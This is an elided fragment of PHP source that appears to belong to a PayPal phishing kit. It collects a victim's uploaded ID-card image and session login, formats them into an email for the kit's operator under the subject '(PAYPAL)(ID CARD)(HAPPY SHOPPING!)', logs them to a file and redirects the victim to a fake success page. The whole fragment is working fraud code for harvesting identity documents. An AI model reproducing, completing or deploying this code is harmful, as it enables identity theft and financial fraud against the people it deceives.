...
*/
        ...
        ############# [+] SESSION INFORMATION [+] ##############
        ########################################################
        if(!empty($_POST['image'])){$FILE_NAME = $_POST['image'];}
        ########################################################
        ################ [+] SYPHER_MESSAGE [+] ################
        ########################################################
        ...
        $SYPHER_MESSAGE .= "<font style='color:#9c0000;'>[+]</font> [ID CARD] = * ID IMG MIGHT NOT SHOW IN SOME EMAIL SERVICES LIKE: GMAIL!<br><img src='$FILE_NAME' width='500px' hight='500px'></img><br>\n";
        $SYPHER_MESSAGE .= "<font style='color:#9c0000;'>[+]</font> [ID LINK] = <a href='$FILE_NAME'>$FILE_NAME</a><br>\n";
        $SYPHER_MESSAGE .= "
       ...
       <font style='color:#9c0000;'>[+]</font> [TIME/DATE] = <font style='color:#0070ba;'>".$TIME_DATE."</font><br>
        ...
        ################ [+] SYPHER_SUBJECT [+] ################
        $SYPHER_SUBJECT = "(PAYPAL)(ID CARD)(HAPPY SHOPPING!)(".$_SESSION['_forlogin_'].")";
        ################ [+] SYPHER_HEADERS [+] ################
        ...
        fclose($FH);}
        ################## [+] NEXT PAGE [+] ###################
        HEADER("Location: ../success/success.php?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");      
?>